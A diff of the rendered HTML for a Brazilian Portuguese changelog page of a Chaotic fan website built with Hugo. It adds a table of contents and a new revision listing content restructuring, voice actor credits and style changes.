@@ -28,6 +28,15 @@
     
 
     
+    
+      
+      
+    
+
+
+    
+
+    
 
     
 
@@ -180,7 +189,7 @@
       
 
       
-      <link rel="stylesheet" href="/assets/css/chaotic.css"/>
+      <link rel="stylesheet" href="/src/css/main.css"/>
       
 
       <nav class="navbar navbar-toggleable-md navbar-inverse bg-inverse"><button class="navbar-toggler navbar-toggler-right" type="button"
@@ -286,10 +295,10 @@
 
         </li>
 
-        <li class="flyout episodes">
+        <li class="flyout videos">
 
           <a class="d-flex align-items-center nav-link dropdown-toggle">
-            Episódios
+            Vídeos
           </a>
 
           <ul class="flyout-content stacked nav flex-column">
@@ -488,7 +497,8 @@
 
     <li class="facebook">
       <a href="https://www.facebook.com/ChaoticOnline"
-          data-title="Facebook" data-width="500" data-height="300">
+          title="Compartilhar no Facebook"
+            data-title="Compartilhar no Facebook" data-width="500" data-height="300">
         <span class="icon">
             <svg>
               <use xlink:href="/assets/images/ui/icons.svg#facebook"/>
@@ -513,7 +523,8 @@
 
     <li class="twitter">
       <a href="https://www.twitter.com/ChaoticOnline"
-        data-title="Twitter" data-width="650" data-height="252">
+        title="Compartilhar no Facebook"
+          data-title="Twitter" data-width="650" data-height="252">
         <span class="icon">
             <svg>
               <use xlink:href="/assets/images/ui/icons.svg#twitter"/>
@@ -532,73 +543,402 @@
         <div class="row">
 
 
-    
+<section id="changelog"
+    class="col-md-12 col-lg-12 col-xl-9 page">
 
-    
+  <div class="row">
 
-    
+    <div class="col-md-12 col-lg-12 col-xl-12">
 
-      
+      <div class="d-flex align-items-center ml-1 title">
 
-      
+        <h2 class="d-inline-flex align-items-center">
+
+          
+
+            
+
+            
+              Chaotic
+            
+
+          
+
+        </h2>
+
         
-      
-
-    
-
-    
-
-      <section id="changelog"
-        class="col-md-12 col-lg-12 col-xl-9 page">
-
-      <div class="row">
-
-        <div class="col-md-12 col-lg-12 col-xl-12">
-
-          <div class="d-flex align-items-center ml-1 title">
-
-            <h2 class="d-inline-flex align-items-center">
-
-              
-
-                
-
-                
-                  Chaotic
-                
-
-              
-
-            </h2>
-
-            
-            <h3 class="d-inline-flex">
-              <span class="icon angle-double-right">&nbsp;</span>
-              Novidades
-            </h3>
-            
-
-          </div>
-
-          <span class="ml-1 hr">&nbsp;</span>
-
-        </div>
+        <h3 class="d-inline-flex">
+          <span class="icon angle-double-right">&nbsp;</span>
+          Novidades
+        </h3>
+        
 
       </div>
 
+      <span class="ml-1 hr">&nbsp;</span>
+
+    </div>
+
+  </div>
+
+  
+
+    
+
+    
+
       
 
-        
 
-        <p>Mudanças de Versão do site Chaotic Online</p>
+<div class="row toc">
+<div class="col-md-12">
+  <div class="row">
+    <h4 data-toggle="collapse" data-target=".toc .panel">Índice</h4>
+  </div>
+  <div class="row panel collapse">
+    <div>
+        <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#versão-atual">Versão Atual</a>
+<ul>
+<li><a href="#adições">Adições</a>
+<ul>
+<li>
+<ul>
+<li><a href="#estruturais">Estruturais</a></li>
+<li><a href="#relacionadas-ao-hugo">Relacionadas ao Hugo</a></li>
+<li><a href="#relacionadas-aos-artigos-publicados">Relacionadas aos Artigos Publicados</a></li>
+<li><a href="#relacionadas-às-páginas-dos-episódios">Relacionadas às Páginas dos Episódios</a></li>
+<li><a href="#relacionados-aos-estilos-do-site">Relacionados aos Estilos do Site</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#remoções">Remoções</a>
+<ul>
+<li>
+<ul>
+<li><a href="#estruturais-1">Estruturais</a></li>
+<li><a href="#relacionadas-ao-hugo-1">Relacionadas ao Hugo</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#alterações">Alterações</a>
+<ul>
+<li>
+<ul>
+<li><a href="#estruturais-2">Estruturais</a></li>
+<li><a href="#relacionadas-aos-artigos-publicados-1">Relacionadas aos Artigos Publicados</a></li>
+<li><a href="#relacionadas-às-páginas-dos-episódios-1">Relacionadas às Páginas dos Episódios</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#correções">Correções</a>
+<ul>
+<li>
+<ul>
+<li><a href="#estruturais-3">Estruturais</a></li>
+<li><a href="#relacionadas-aos-artigos-publicados-2">Relacionadas aos Artigos Publicados</a></li>
+<li><a href="#relacionadas-às-páginas-dos-episódios-2">Relacionadas às Páginas dos Episódios</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#alterações-diversas">Alterações Diversas</a></li>
+</ul></li>
+<li><a href="#rev-dff4edc">rev. dff4edc</a>
+<ul>
+<li><a href="#adições-1">Adições</a>
+<ul>
+<li>
+<ul>
+<li><a href="#novos-conteúdos">Novos Conteúdos</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#remoções-1">Remoções</a>
+<ul>
+<li>
+<ul>
+<li><a href="#relacionadas-aos-artigos-publicados-3">Relacionadas aos Artigos Publicados</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#alterações-1">Alterações</a>
+<ul>
+<li>
+<ul>
+<li><a href="#relacionadas-aos-artigos-publicados-4">Relacionadas aos Artigos Publicados</a></li>
+<li><a href="#relacionadas-ao-hugo-2">Relacionadas ao Hugo</a></li>
+<li><a href="#relacionados-aos-estilos-do-site-1">Relacionados aos Estilos do Site</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#correções-1">Correções</a>
+<ul>
+<li>
+<ul>
+<li><a href="#relacionadas-ao-hugo-3">Relacionadas ao Hugo</a></li>
+<li><a href="#relacionadas-aos-artigos-publicados-5">Relacionadas aos Artigos Publicados</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#alterações-diversas-1">Alterações Diversas</a></li>
+</ul></li>
+<li><a href="#rev-cc4406c">rev. cc4406c</a>
+<ul>
+<li><a href="#adições-2">Adições</a>
+<ul>
+<li>
+<ul>
+<li><a href="#estruturais-4">Estruturais</a></li>
+<li><a href="#relacionadas-às-páginas-dos-episódios-3">Relacionadas às Páginas dos Episódios</a></li>
+<li><a href="#relacionadas-ao-hugo-4">Relacionadas ao Hugo</a></li>
+<li><a href="#relacionados-aos-estilos-do-site-2">Relacionados aos Estilos do Site</a></li>
+<li><a href="#relacionados-ao-conteúdo-geral">Relacionados ao Conteúdo Geral</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#remoções-2">Remoções</a>
+<ul>
+<li>
+<ul>
+<li><a href="#estruturais-5">Estruturais</a></li>
+<li><a href="#relacionadas-ao-hugo-5">Relacionadas ao Hugo</a></li>
+<li><a href="#relacionados-aos-estilos-do-site-3">Relacionados aos Estilos do Site</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#alterações-2">Alterações</a>
+<ul>
+<li>
+<ul>
+<li><a href="#estruturais-6">Estruturais</a></li>
+<li><a href="#relacionadas-ao-hugo-6">Relacionadas ao Hugo</a></li>
+<li><a href="#relacionados-aos-estilos-do-site-4">Relacionados aos Estilos do Site</a></li>
+<li><a href="#relacionados-ao-conteúdo-geral-1">Relacionados ao Conteúdo Geral</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#correções-2">Correções</a>
+<ul>
+<li>
+<ul>
+<li><a href="#estruturais-7">Estruturais</a></li>
+<li><a href="#relacionadas-ao-hugo-7">Relacionadas ao Hugo</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#alterações-diversas-2">Alterações Diversas</a></li>
+</ul></li>
+<li><a href="#rev-4c972b7">rev. 4c972b7</a>
+<ul>
+<li><a href="#adições-3">Adições</a>
+<ul>
+<li>
+<ul>
+<li><a href="#estruturais-8">Estruturais</a></li>
+<li><a href="#relacionadas-aos-artigos-publicados-6">Relacionadas aos Artigos Publicados</a></li>
+<li><a href="#relacionadas-às-páginas-dos-episódios-4">Relacionadas às Páginas dos Episódios</a></li>
+<li><a href="#relacionadas-ao-hugo-8">Relacionadas ao Hugo</a></li>
+<li><a href="#novos-conteúdos-1">Novos Conteúdos</a></li>
+<li><a href="#relacionadas-à-internacionalização-i18n">Relacionadas à Internacionalização (i18n)</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#remoções-3">Remoções</a>
+<ul>
+<li>
+<ul>
+<li><a href="#estruturais-9">Estruturais</a></li>
+<li><a href="#relacionadas-aos-artigos-publicados-7">Relacionadas aos Artigos Publicados</a></li>
+<li><a href="#relacionadas-às-páginas-dos-episódios-5">Relacionadas às Páginas dos Episódios</a></li>
+<li><a href="#relacionadas-ao-hugo-9">Relacionadas ao Hugo</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#alterações-3">Alterações</a>
+<ul>
+<li>
+<ul>
+<li><a href="#estruturais-10">Estruturais</a></li>
+<li><a href="#relacionadas-aos-artigos-publicados-8">Relacionadas aos Artigos Publicados</a></li>
+<li><a href="#relacionadas-às-páginas-dos-episódios-6">Relacionadas às Páginas dos Episódios</a></li>
+<li><a href="#relacionadas-ao-hugo-10">Relacionadas ao Hugo</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#correções-3">Correções</a>
+<ul>
+<li>
+<ul>
+<li><a href="#estruturais-11">Estruturais</a></li>
+<li><a href="#relacionadas-aos-artigos-publicados-9">Relacionadas aos Artigos Publicados</a></li>
+<li><a href="#relacionadas-às-páginas-dos-episódios-7">Relacionadas às Páginas dos Episódios</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#relacionadas-às-imagens">Relacionadas às Imagens</a>
+<ul>
+<li>
+<ul>
+<li><a href="#imagens-grandes-adicionadas-substituídas">Imagens Grandes adicionadas/substituídas</a></li>
+<li><a href="#imagens-de-cartas-adicionadas-substituídas">Imagens de Cartas adicionadas/substituídas</a></li>
+<li><a href="#mais">Mais&hellip;</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#alterações-diversas-3">Alterações Diversas</a></li>
+</ul></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+    </div>
+  </div>
+</div>
+</div>
 
-<p></p>
 
 <h3 id="versão-atual">Versão Atual</h3>
 
-<p><small>Publicada em 07/08/2018 às 19:00</small></p>
+<p><small>Publicada em 16/07/2018 às 19:00</small></p>
 
 <h4 id="adições">Adições</h4>
+
+<h6 id="estruturais">Estruturais</h6>
+
+<ul>
+<li><p>Com a reestruturação interna feita (ver abaixo), a fim de fazer a Categoria <em>Perim</em> funcionar uma Página com sua própria URL Personalizada precisou ser adicionada listando todos os tipos de Cartas nela</p></li>
+
+<li><p>E com a alteração acima, uma nova entrada nos Breadcrumbs foi adicionada em todas as Páginas sob a Categoria <em>Perim</em> apontando para essa Página criada</p>
+
+<ul>
+<li>Entradas i18n (internacionalização) foram adicionadas para a Página de Listagem <em>Perim</em> recém-adicionada e para as alterações sobre os títulos vistos com o passar do mouse &ldquo;Compartilhar no Facebook/Twitter&rdquo; (ver abaixo)</li>
+</ul></li>
+
+<li><p>Adicionada uma configuração ao Compilador do Hugo para prevenir a pluralização automática dos Títulos de Seção, impedindo, por exemplo, &ldquo;Perims&rdquo;, mesmo que a entrada i18n correspondente não esteja pluralizada</p></li>
+</ul>
+
+<h6 id="relacionadas-ao-hugo">Relacionadas ao Hugo</h6>
+
+<ul>
+<li><p>As adições necessárias ao Template das Páginas de Vídeo para exibir o Elenco do Episódio foi criado, porém, já que o recurso ainda está meio que em estágio BETA, ele foi efetivamente implementado apenas no Episódio #01, Temporada #01</p></li>
+
+<li><p>Adicionado um texto mais amigável ao passa o mouse sobre os Ícones Sociais à esquerda usando a entrada i18n “Compartilhar no Facebook/Twitter”</p></li>
+</ul>
+
+<h6 id="relacionadas-aos-artigos-publicados">Relacionadas aos Artigos Publicados</h6>
+
+<ul>
+<li><p>Adicionada a <em>Data de Publicação</em> ausente para os seguintes Artigos: Tartarek, Ulmar e Riverlands</p></li>
+
+<li><p>Adicionados os Dubladores recém-descobertos: Antidaeon (Nestor Chiesse), Intress (Samira Fernandes), Mezzmarr (Gilberto Baroli), Slurhk (Fábio Moura), Tangath Toborn (Gileno Santoro), Zalic (João Ângelo), Dardemus (Gilberto Baroli), Kughar (Mauro Castro), Khybon (Fábio Moura), Lord Van Bloot (Carlos Silveira), Magmon (Luiz Antônio Lobue), Spyder (Guilherme Lopes), Ulmar (Faduli Costha), Príncipe Mudeenu (Mauro Castro), Qwun (Mauro Eduardo de Lima), Wamma (Gilberto Baroli) e Ursis (Mauro Castro)</p></li>
+
+<li><p>Adicionada um novo arquivo i18n com todos as URLs de todos Perfis dos Dubladores identificados. Com isso, não apenas a outra entra  <code>link</code> não precisa mais ser manualmente preenchida (ver mais abaixo) mas também não é necessário duplicar informação em casos em que um Dublador interpreta múltiplos personagens</p></li>
+
+<li><p>Seguindo a adição acima, todas as URLs de todos os Perfis dos Dubladores identificados foram substituídas em favor do <a href="https://www.myanimelist.com">MyAnimeList.com</a>. Embora restrito apenas a Animes e independente do fato de &ldquo;Chaotic&rdquo; não aparecer no site — já que não é um Anime propriamente dito — é mais apropriado para o contexto (desenho) -E- oferece informações mais completas e organizadas sobre os Personagens, os Dubladores que os interpretaram e as diferentes produções nas quais as mesmas pessoas participaram, o que nem sempre é possível mesmo no IMDB ou na Wikipédia.
+Porém, uma vez que nem todo Dublador trabalha com Animes, o IMDB e a Wikipédia permanecem como alternativa em alguns casos</p></li>
+
+<li><p>Adicionado o Bloco de Anúncios ausente no Artigo publicado sobre o Tartarek (Apenas em Inglês)</p></li>
+
+<li><p>Adicionado um parágrafo adicional sob o Título de Seção <em>Na Animação</em> no Artigo publicado sobre a Takinom para que o mesmo parágrafo no Artigo do Nauthilax ficasse mais preciso</p></li>
+</ul>
+
+<h6 id="relacionadas-às-páginas-dos-episódios">Relacionadas às Páginas dos Episódios</h6>
+
+<ul>
+<li>Publicado o Episódio #16, Temporada #01 com áudio em Português Brasileiro</li>
+</ul>
+
+<h6 id="relacionados-aos-estilos-do-site">Relacionados aos Estilos do Site</h6>
+
+<ul>
+<li><p>Adicionadas as Cores Tribais para os Danians (marrom) e os Sem Tribo (cinza claro) para que a caixa com o Dublador e a Lista de URLs dos Episódios nos quais a Criatura aparece não com a cor padrão ou sem cor de fundo</p></li>
+
+<li><p>Adicionada uma linha cinza suave entre as revisões na Página de Novidades permitindo uma certa distinção entre cada uma delas</p></li>
+</ul>
+
+<h4 id="remoções">Remoções</h4>
+
+<h6 id="estruturais-1">Estruturais</h6>
+
+<ul>
+<li>Já que a entrada i18n referente aos Episódios como título não é mais usada (ver abaixo) ela foi removida</li>
+</ul>
+
+<h6 id="relacionadas-ao-hugo-1">Relacionadas ao Hugo</h6>
+
+<ul>
+<li><p>Com a reestruturação interna feita (ver abaixo) não há mais necessidade de um Arquivo de Modelo específico paras as Curiosidades, já que agora elas compartilham o mesmo dos Episódios normais e, por isso, foi removido</p></li>
+
+<li><p>Removida a possibilidade de se ter uma Criatura/Local com raridade &ldquo;mista&rdquo; em favor o atributo <code>rarity</code> do Shortcode <em>Card</em></p></li>
+
+<li><p>Removido o Facebook Analytics. Não apenas porque recursos que dependem do Facebook aumentam o tempo de carregamento da página mas também porque as informações fornecidas não são exatamente úteis, ao menos não agora</p></li>
+</ul>
+
+<h4 id="alterações">Alterações</h4>
+
+<h6 id="estruturais-2">Estruturais</h6>
+
+<ul>
+<li><p>Uma reestruturação interna maciça foi feita. Agora em vez de ter todos os Arquivos de Conteúdo das categorias de <em>Perim</em> soltos no diretório raiz <code>/content</code> do Hugo, elas estão agora agrupadas sob <code>/perim</code> como sempre deveria ser. Não apenas isso é mais organizado como também permite que Páginas de Listagem tenham suas próprias URLs Personalizadas em vez de simplesmente um alias</p></li>
+
+<li><p>Com a alteração acima, quase todas as ocorrências de uso da variável <code>.Section</code> do Hugo foram substituídas por <code>.CurrentSection</code>, que move o &ldquo;ponteiro&rdquo; de análise do <em>path</em> do início para o fim</p></li>
+
+<li><p>Os Parâmetros de FrontMatter <code>weight</code> e <code>datePublished</code> foram movidos mais para perto do topo onde eles deveriam estar, já que representam as mais básicas informações dos Artigos/Páginas</p></li>
+
+<li><p>Atualizados os comentários nos Parâmetros de FrontMatter na versão em Inglês do Artigo da Takinom com as mudanças feitas nesta revisão</p></li>
+
+<li><p>Com a adição do arquivo i18n com as URLs dos Perfis dos Dubladores identificados, a forma como os links associados às pessoas agora é automática. Contanto que o nome do Dublador tenha sido escrito corretamente, independente da capitalização das letras e/ou caracteres acentuados (já que estes são tratados automaticamente) -E- uma entrada i18n com essa versão limpa do nome possa ser encontrada, o texto receberá o link automaticamente</p></li>
+
+<li><p>Já que agora tantos os <em>Episódios</em> quanto as <em>Curiosidades</em> fazem parte do memso grupo, a entrada i18n com o link que apontava para a seção <em>/episodios</em> foi alterado para <code>/pt/videos</code></p></li>
+
+<li><p>Atualizada a Página com as Novidades</p></li>
+</ul>
+
+<h6 id="relacionadas-aos-artigos-publicados-1">Relacionadas aos Artigos Publicados</h6>
+
+<ul>
+<li><p>Correção gramatical no Artigo publicado sobre o Tartarek</p></li>
+
+<li><p>Ligeiramente melhorado o &ldquo;Flavour Text&rdquo; de Lord Van Bloot (apenas Português Brasileiro)</p></li>
+
+<li><p>A fim de mostrar os Dubladores recentemente descobertos (ver acima), independentemente de haver um Artigo completo publicado, uma vez que tanto a lista de Episódios quando o Dublador compartilham o mesmo Template HTML, a lista de Episódios de todas as Criaturas acima descritas foram preenchidas</p></li>
+
+<li><p>Melhorado o parágrafo sob o Título de Seção <em>Participações</em>, sob <em>Na Animação</em>, não apenas para simplificar a escrita mas também para não implicar que a Criatura/Local descrita no Artigo necessariamente aparece &ldquo;em pessoa&rdquo;, afinal, elas podem apenas ser visualmente mencionadas com uma foto, por exemplo, num Quadro de Batalha, sem efetivamente participar de uma luta e Chaotic.</p></li>
+</ul>
+
+<h6 id="relacionadas-às-páginas-dos-episódios-1">Relacionadas às Páginas dos Episódios</h6>
+
+<ul>
+<li><p>O vídeo do Episódio #15, Temporada #01 com áudio em Português Brasileiro teve algumas partes refeitas para melhorar as transições entre o áudio dublado remasterizado e o áudio original reaproveitado (cenas com apenas sons de fundo ou efeitos, por exemplo) e, por isso, a página referente teve de ser atualizada com o novo link</p></li>
+
+<li><p>Substituída todas Trilhas de Breadcrumb e seus links de <em>Episódios</em> por <em>Vídeos</em> em todos os Arquivos de Conteúdo, uma vez que a primeira servia unicamente para quando os Episódios e as Curiosidades não podeiam fazer parte do mesmo grupo</p></li>
+</ul>
+
+<h4 id="correções">Correções</h4>
+
+<h6 id="estruturais-3">Estruturais</h6>
+
+<ul>
+<li>Corrigido um problema com Parâmetros de FrontMatter mal construídos que deveriam gerar um erro em tempo de execução mas que até a reestruturação interna feita nesta revisão eram silenciosamente ignorados &gt;:(</li>
+</ul>
+
+<h6 id="relacionadas-aos-artigos-publicados-2">Relacionadas aos Artigos Publicados</h6>
+
+<ul>
+<li><p>Corrigida a Raridade da Takinom (apenas Português Brasileiro)</p></li>
+
+<li><p>Corrigida uma palavra-chave com o nome do Slurhk no Episódio #08, Temporada #02</p></li>
+
+<li><p>Corrigida Artigo sobre <em>Akkrean</em> que não continha o Termo de Taxnomia <code>rarity</code> (apenas em Inglês)</p></li>
+</ul>
+
+<h6 id="relacionadas-às-páginas-dos-episódios-2">Relacionadas às Páginas dos Episódios</h6>
+
+<ul>
+<li><p>Corrigida a duração do Episódio #15, Temporada #01 da versão com áudio em Português Brasileiro que é ligeiramente diferente da original em Inglês</p></li>
+
+<li><p>Corrigidos os detalhes do Episódio #15, Temporada #01 da versão com áudio em Português Brasileiro pois esta não está em Inglês (óbvio) mas também não tem nenhuma legenda como descrito anteriormente</p></li>
+</ul>
+
+<h4 id="alterações-diversas">Alterações Diversas</h4>
+
+<ul>
+<li>Atualizado CSS minificado</li>
+</ul>
+
+<h3 id="rev-dff4edc">rev. dff4edc</h3>
+
+<p><small>Publicada em 07/08/2018 às 19:00</small></p>
+
+<h4 id="adições-1">Adições</h4>
 
 <ul>
 <li><p>Adicionada entradas i18n (internacionalização) para os novos Arquivos de Conteúdo (ver abaixo)</p></li>
@@ -608,7 +948,7 @@
 <li><p>Adicionadas Imagens de Carta para <em>Tartarek</em> e <em>Tartarek, Opressor Psíquico</em> para o Artigo publicado nesta revisão</p></li>
 </ul>
 
-<h6 id="novos-arquivos-de-conteúdo">Novos Arquivos de Conteúdo</h6>
+<h6 id="novos-conteúdos">Novos Conteúdos</h6>
 
 <ul>
 <li>Ataques
@@ -634,7 +974,9 @@
 </ul></li>
 </ul>
 
-<h4 id="remoções">Remoções</h4>
+<h4 id="remoções-1">Remoções</h4>
+
+<h6 id="relacionadas-aos-artigos-publicados-3">Relacionadas aos Artigos Publicados</h6>
 
 <ul>
 <li><p>Removidas todas as ocorrências de &ldquo;Em Chaotic&hellip;&rdquo; normalmente nas variações da Carta principal de um Artigo em favor de uma versão mais genérica, de redação mais imersa</p></li>
@@ -642,7 +984,11 @@
 <li><p>Removido um hash-link no Artigo sobre as <em>Geleiras</em></p></li>
 </ul>
 
-<h4 id="alterações">Alterações</h4>
+<h4 id="alterações-1">Alterações</h4>
+
+<h6 id="relacionadas-aos-artigos-publicados-4">Relacionadas aos Artigos Publicados</h6>
+
+<h6 id="relacionadas-ao-hugo-2">Relacionadas ao Hugo</h6>
 
 <ul>
 <li><p>Mesclados os Títulos de Seção <em>Jogo</em> e <em>Combate</em> em um só — <em>Jogo &amp; Combate</em> — em todos os Artigos já publicados</p></li>
@@ -650,6 +996,8 @@
 <li><p>Com a mudança acima, o parágrafo abaixo de <em>Jogo</em> foi movido para após o Shortcode <em>Card</em></p></li>
 
 <li><p>E com a mudança acima, os seguintes Artigos tiveram as redações próximas à mudança revisadas: H&rsquo;earring, Chaor e Malvadine</p></li>
+
+<li><p>Aumentadas a largura das colunas com as Características Biográficas das Criaturas por reduzir um pouco a coluna com os rótulos dando espaço para mais textos longos</p></li>
 
 <li><p>Com a remoção da expressão &ldquo;Em Chaotic&rdquo; (ver acima), os seguintes Artigos tiveram que ser ligeiramente ajustados: Blazier, H&rsquo;earring, Chaor, Ulmar e Região dos Rios</p></li>
 
@@ -664,13 +1012,7 @@
 <li><p>Atualizada a página com as Novidades</p></li>
 </ul>
 
-<h6 id="sobre-o-hugo">Sobre o Hugo</h6>
-
-<ul>
-<li>Aumentadas a largura das colunas com as Características Biográficas das Criaturas por reduzir um pouco a coluna com os rótulos dando espaço para mais textos longos</li>
-</ul>
-
-<h6 id="sobre-os-estilos">Sobre os Estilos</h6>
+<h6 id="relacionados-aos-estilos-do-site-1">Relacionados aos Estilos do Site</h6>
 
 <ul>
 <li><p>O Índice foi puxado mais para esquerda como deveria ser</p></li>
@@ -680,15 +1022,21 @@
 <li><p>As margens esquerda/direita da Caixa de Informações das Criaturas foram removidas na versão mobile, espremendo um pouco mais de largura para as colunas, ajudando textos longos a não quebrar para novas linhas</p></li>
 </ul>
 
-<h4 id="correções">Correções</h4>
+<h4 id="correções-1">Correções</h4>
+
+<h6 id="relacionadas-ao-hugo-3">Relacionadas ao Hugo</h6>
 
 <ul>
-<li><p>Corrigidas palavras-chave sobre o <em>Tartarek</em> nos últimos três episódios da Temporada #02, apontando para a variante <em>Opressor Psíquico</em></p></li>
-
-<li><p>Corrigido um problema que gerava erros em tempo de execução quando lendo informações do repositório GIT de arquivos recém-adicionados</p></li>
+<li>Corrigido um problema que gerava erros em tempo de execução quando lendo informações do repositório GIT de arquivos recém-adicionados</li>
 </ul>
 
-<h4 id="alterações-diversas">Alterações Diversas</h4>
+<h6 id="relacionadas-aos-artigos-publicados-5">Relacionadas aos Artigos Publicados</h6>
+
+<ul>
+<li>Corrigidas palavras-chave sobre o <em>Tartarek</em> nos últimos três episódios da Temporada #02, apontando para a variante <em>Opressor Psíquico</em></li>
+</ul>
+
+<h4 id="alterações-diversas-1">Alterações Diversas</h4>
 
 <ul>
 <li>Atualizado CSS minificado</li>
@@ -698,9 +1046,9 @@
 
 <p><small>Publicada em 02/07/2018 às 10:30:00</small></p>
 
-<h4 id="adições-1">Adições</h4>
+<h4 id="adições-2">Adições</h4>
 
-<h6 id="estruturais">Estruturais</h6>
+<h6 id="estruturais-4">Estruturais</h6>
 
 <ul>
 <li><p>Adicionada a Entidade HTML <code>&amp;nbsp;</code> a quase todas as tags vazias para que elas não sejam de fato vazias e, assim, consideradas como possíveis candidatos a remoção por HTML Minifiers</p></li>
@@ -712,13 +1060,13 @@
 <li><p>Adicionado Dados Estruturados de <code>SiteNavigationElement</code> apontando para o Menu de Navegação como mais uma melhoria para o SEO (Otimização para Motores de Busca)</p></li>
 </ul>
 
-<h6 id="sobre-as-páginas-de-vídeo">Sobre as Páginas de Vídeo</h6>
+<h6 id="relacionadas-às-páginas-dos-episódios-3">Relacionadas às Páginas dos Episódios</h6>
 
 <ul>
 <li>Publicado Episódio #15, Temporada #01 com áudio dublado em Português Brasileiro</li>
 </ul>
 
-<h6 id="sobre-o-hugo-1">Sobre o Hugo</h6>
+<h6 id="relacionadas-ao-hugo-4">Relacionadas ao Hugo</h6>
 
 <ul>
 <li><p>Adicionado/Ajustados várias classes do Sistema de Grade do Bootstrap nos Arquivos de Modelo para prover responsividade máxima em diferentes dispositivos e/ou resoluções</p></li>
@@ -728,7 +1076,7 @@
 <li><p>Adicionado um elemento <code>&lt;wrapper&gt;</code> que engloba todo o conteúdo das páginas do site, como parte da correção do rodapé cobrindo parte do conteúdo principal. A técnica foi emprestada <a href="https://www.codeply.com/go/tGamlWscIB">deste Codeply</a> e, apesar de funcionar, a presença de uma tag <code>&lt;wrapper&gt;</code> ali torna semanticamente inválido</p></li>
 </ul>
 
-<h6 id="sobre-os-estilos-1">Sobre os Estilos</h6>
+<h6 id="relacionados-aos-estilos-do-site-2">Relacionados aos Estilos do Site</h6>
 
 <ul>
 <li><p>Adicionados os ícones do Github e do HUGO, anteriormente adicionados ao arquivo com os ícones SVG da UI, ao novo rodapé</p></li>
@@ -736,7 +1084,7 @@
 <li><p>Adicionadas mais <em>Media Queries</em> como auxílio a melhor responsividade criada com as alterações inclusões das classes do Sistema de Grade do Bootstrap</p></li>
 </ul>
 
-<h6 id="sobre-conteúdo-público">Sobre Conteúdo Público</h6>
+<h6 id="relacionados-ao-conteúdo-geral">Relacionados ao Conteúdo Geral</h6>
 
 <ul>
 <li><p>Adicionada apreciação à <a href="https://pt-br.libreoffice.org/projetos/vero/">Equipe do VERO</a> na página de Dizeres Legais</p></li>
@@ -744,9 +1092,9 @@
 <li><p>Adicionado essa página com informações para nerds (:p) sobre o que mudou de uma versão pra outra</p></li>
 </ul>
 
-<h4 id="remoções-1">Remoções</h4>
+<h4 id="remoções-2">Remoções</h4>
 
-<h6 id="estruturais-1">Estruturais</h6>
+<h6 id="estruturais-5">Estruturais</h6>
 
 <ul>
 <li><p>Removida entrada i18n (Internacionalização) para o link social do Patreon. Não apenas porque ele já está oculto há algum tempo mas também porque a nova marcação de links sociais (ver abaixo) não usa nenhum texto</p></li>
@@ -754,7 +1102,7 @@
 <li><p>Removidos alguns arquivos/diretórios erroneamente adicionados em <em>commits</em> anteriores por removê-los do cache do GIT</p></li>
 </ul>
 
-<h6 id="sobre-o-hugo-2">Sobre o Hugo</h6>
+<h6 id="relacionadas-ao-hugo-5">Relacionadas ao Hugo</h6>
 
 <ul>
 <li><p>Removidas restrições de zoom</p></li>
@@ -764,7 +1112,7 @@
 <li><p>Removidas indentações desnecessárias em todos Modelos Parciais, afinal, eles serão <em>usados</em> de forma composta, mas editados individualmente</p></li>
 </ul>
 
-<h6 id="sobre-os-estilos-2">Sobre os Estilos</h6>
+<h6 id="relacionados-aos-estilos-do-site-3">Relacionados aos Estilos do Site</h6>
 
 <ul>
 <li><p>Removia a margem superior usada nos Ícones das Bandeiras porque o novo Menu de Navegação tem um melhor alinhamento graças ao Flexbox usado</p></li>
@@ -772,15 +1120,15 @@
 <li><p>Com todos os novos recursos e alterações, VÁRIAS regras não são mais necessárias e foram removidas. Um total de aproximadamente 300 linhas removidas</p></li>
 </ul>
 
-<h4 id="alterações-1">Alterações</h4>
+<h4 id="alterações-2">Alterações</h4>
 
-<h6 id="estruturais-2">Estruturais</h6>
+<h6 id="estruturais-6">Estruturais</h6>
 
 <ul>
 <li>Alteradas algumas URL desnecessariamente Absolutas em favor de Relativas</li>
 </ul>
 
-<h6 id="sobre-o-hugo-3">Sobre o Hugo</h6>
+<h6 id="relacionadas-ao-hugo-6">Relacionadas ao Hugo</h6>
 
 <ul>
 <li><p>Os Dados Estruturados para <strong>Organização</strong> foi movido para o topo, ficando de um jeito mais hierárquico</p></li>
@@ -806,7 +1154,7 @@
 <li><p>Alterada a classe CSS usada em um dos dois possíveis erros fatais que impedem os resultados de uma busca de aparecer possam ser distinguidos</p></li>
 </ul>
 
-<h6 id="sobre-os-estilos-3">Sobre os Estilos</h6>
+<h6 id="relacionados-aos-estilos-do-site-4">Relacionados aos Estilos do Site</h6>
 
 <ul>
 <li><p>O novo Menu de Navegação fez o <em>Flyout Content</em> — a caixa que abre ao passar o mouse — do Menu de Idiomas muito pequeno, então algum espaçamento foi adicionado a eles</p></li>
@@ -822,7 +1170,7 @@
 <li><p>Algumas classes foram reordenadas de uma forma mais pseudo-hierárquica</p></li>
 </ul>
 
-<h6 id="sobre-conteúdo-público-1">Sobre Conteúdo Público</h6>
+<h6 id="relacionados-ao-conteúdo-geral-1">Relacionados ao Conteúdo Geral</h6>
 
 <ul>
 <li><p>Aplicadas correções orto-gramaticais à versão em Português Brasileiros dos seguintes Artigos/Páginas: Maxxor, Najarin, Blazier, Heptadd, Takinom, Nauthilax, H&rsquo;earring, Chaor, Malvadine, Geleiras, Cidade do Submundo, Caverna de Cristal, Região dos Rios e as Páginas de Dizeres Legais e Termos de Uso</p></li>
@@ -830,21 +1178,21 @@
 <li><p>Aplicadas correções gramaticais à versão em Inglês das Páginas de Dizeres Legais e Termos de Uso</p></li>
 </ul>
 
